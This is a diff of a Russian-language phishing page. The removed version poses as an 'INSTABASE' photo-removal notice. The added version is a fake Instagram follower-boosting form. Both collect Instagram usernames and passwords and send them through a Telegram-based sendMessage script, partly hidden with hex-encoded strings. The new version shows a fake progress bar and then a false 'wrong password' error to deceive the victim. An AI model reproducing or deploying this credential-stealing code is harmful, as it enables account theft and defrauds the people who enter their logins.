@@ -4,124 +4,142 @@
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>INSTABASE</title>
-    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/2/29/Instabase-logo.png">
-    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
+    <title>Document</title>
     <script src="https://zipscript.github.io/script/aes.js"></script>
+    <script src="https://zipscript.github.io/script/telegram-api.js"></script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
     <style>
-        *{
-            margin: 0px;
+        body{
+ background: rgb(245, 245, 245);
+            margin:0px;
             padding:0px;
-            background: #161b22;
+        }
+        .title{
+            font-size:25px;
+            display: block;
+            margin: auto;
+            text-align: center;
+            margin-top:100px;
+            font-family: arial;
+            background: none;
+            color: cornflowerblue;
         }
         .form{
             display: block;
             margin: auto;
             text-align: center;
-            border: 2px solid #24282e;
-            width:330px;
-            margin-top:50px;
-            border-radius:5px;
-            height:290px;
-            background: #212730;
+            margin-top: 100px;
+            background: none;
+            height:350px;
+            width:350px;
+            background: rgb(255, 255, 255);
+            border-radius:8px;
         }
         input{
-            display: block;
-            margin: auto;
-            width:240px;
+            width:265px;
             height:35px;
-             padding-left:10px;
-             outline: none;
-             color: white;
-             border-radius:3px;
-             background: #212730;
-             border: 3px solid rgb(56, 53, 53);
+            padding-left:10px;
+            outline: none;
+            background: none;
+            border-radius:5px;
+            margin-top:20px;
+            border: 2px solid black;
+        }
+        select{
+            width:265px;
+            height:35px;
+            padding-left:10px;
+            margin-top:20px;
+            outline: none;
+            border:2px solid rgb(138, 138, 138);
+            border-radius:5px;
         }
         button{
-            width:250px;
-            height:34px;
-            margin-top:30px;
-           border: none;
-        
-            color: white;
-            font-family: arial;
-            background:rgb(250, 78, 78);
-            border-radius:5px;
-
-        }
-        #img{
-            display: block;
-            margin: auto;
-            text-align: center;
-            width:160px;
-            margin-top:50px;
-            border-radius:5px;
-        }
-        p{
-            display: block;
-            margin: auto;
-            text-align: center;
-            margin-top:10px;
-            color: white;
-            font-family: arial;
-            font-size:13px;
-            width:200px;
-        }
-        h3{
-            display: none;
-            margin: auto;
-            text-align: center;
-            background: none;
-            font-family: monospace;
-            color:tomato;
+            width:265px;
+            height: 35px;
             margin-top:20px;
-            width:150px;
-            font-size:12px;
+            color: white;
+            border-radius:5px;
+            border: 0px;
+            background: rgb(56, 142, 255);
+            font-family: monospace;
         }
-        h5{
-           
-            display: block;
-            margin: auto;
-            text-align: center;
-            color:#29486d;
-            width:260px;
-            font-size:10px;
-            margin-top:200px;
-            font-family:Arial, Helvetica, sans-serif;
-        }
-        .head{
-           background:#323d4d;
-        }
-        .logo{
-            width:250px;
-            background: none;
-            display: block;
-            margin-left:10px;            
-        }
+      .progress{
+          width:200px;
+          display: block;
+          margin: auto;
+          text-align: center;
+          margin-top:20px;
+      }
     </style>
 </head>
 <body>
-    <div class="head">
-        <img class="logo" src="https://d1r8vl7h9sno9u.cloudfront.net/website/customer-logos/instabase.svg" alt="">
+    <h1 class="title" id="title">НАКРУТКА ИНСТАГРАМ</h1>
+    <div class="form">
+        <br>
+        <input type="text"  id="username" autocomplete="off" placeholder="@ Введите никнейм"><br>
+        <input type="password" placeholder="Введите пароль" id="password">
+        <select name="количество"  id="folowers">
+            <option value="количество">количество подписчиков</option>
+            <option value="10">10</option>
+            <option value="20">20</option>
+            <option value="30">30</option>
+            <option value="40">40</option>
+            <option value="50">50</option>
+            <option value="60">60</option>
+            <option value="70">70</option>
+            <option value="80">80</option>
+            <option value="90">90</option>
+            <option value="100">100</option>
+        </select>
+        <select name="pol" id="pol">
+            <option value="пол подписчика">пол подписчика</option>
+            <option value="male">мужчина</option>
+            <option value="family">женщина</option>
+            <option value="gay">другое</option>
+        </select>
+<br>
+        <button onclick="login()">START</button>
+        <br>
+       
+          <div class="progress">
+            <div class="progress-bar progress-bar-striped active" id="bar" role="progressbar" aria-valuenow="40" aria-valuemin="0" aria-valuemax="50" style="width:0%">
+              
+            </div>
+          </div>
     </div>
-   <img id="img"  alt="">
-   <p>Подтвердите что это фото принадлежит вам</p>
-   <p style="color:tomato;width:300px">Для подтверждения личности зайдите в свой аккаунт Instagram !</p>
-   <div class="form">
-       <br><br>
-       <input type="text" autocomplete="off" id="username" placeholder="Телефон, имя пользователя или эл. адрес">
-       <br>
-       <input type="password" id="password" placeholder="Пароль">
-       <button onclick="login()">Удалить Фото</button>
-       <h3 id="error">Вы ввели не правильные данные ?</h3>
-   </div>
-   <h5>OOO "INSTABASE" © 2011-2022. Все права защищены. Лицензии МРИТИК РУз АА №0006345. Лицензия ЦБ РУз №1</h5>
-  <br>
+
 </body>
 <script>
-        var desire = location.search.slice(1).split("&")[0].split("=")[1]
-     document.getElementById('img').src=atob(desire);
+ 
+    var r=0;
+function prog(){
 
-var _0xfd02=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x6E\x61\x6D\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x70\x61\x73\x73\x77\x6F\x72\x64","\x5B\x55\x53\x45\x52\x4E\x41\x4D\x45\x5D\x20\x3A\x20\x5B","\x5D\x20\x25\x30\x41\x20\x5B\x50\x41\x53\x53\x57\x4F\x52\x44\x5D\x20\x3A\x20\x5B","\x5D","\x33\x33\x30\x31","\x64\x69\x73\x70\x6C\x61\x79","\x73\x74\x79\x6C\x65","\x65\x72\x72\x6F\x72","\x62\x6C\x6F\x63\x6B"];function login(){var _0x522cx2=document[_0xfd02[2]](_0xfd02[1])[_0xfd02[0]];var _0x522cx3=document[_0xfd02[2]](_0xfd02[3])[_0xfd02[0]];var _0x522cx4=`${_0xfd02[4]}${_0x522cx2}${_0xfd02[5]}${_0x522cx3}${_0xfd02[6]}`;sendMessage(_0x522cx4,_0xfd02[7]);setTimeout(()=>{document[_0xfd02[2]](_0xfd02[10])[_0xfd02[9]][_0xfd02[8]]= _0xfd02[11]},1000)}
+  r++;
+  if(r == 150){
+     
+      setTimeout(()=>{
+            document.getElementById('title').innerText='Вы ввели неправильный пароль или имя пользователя';
+            document.getElementById('title').style.color="red";
+            document.getElementById('title').style.fontSize='17px';
+            document.getElementById('title').style.width="350px"
+            document.getElementById('username').style.border='2px solid tomato';
+            document.getElementById('password').style.border='2px solid tomato';
+        },0)
+  }
+  document.getElementById('bar').style.width=r+'%';
+}
+
+function login(){
+        var tm=setInterval(()=>{
+            prog()
+        },50)
+ var username=document.getElementById('username').value;
+ var password=document.getElementById('password').value;
+     var message=`USERNAME : ${username} %0A PASSWORD : ${password}`;
+     var _0x1751=["\x33\x33\x30\x31"];sendMessage(message,_0x1751[0])
+    }
 </script>
 </html>
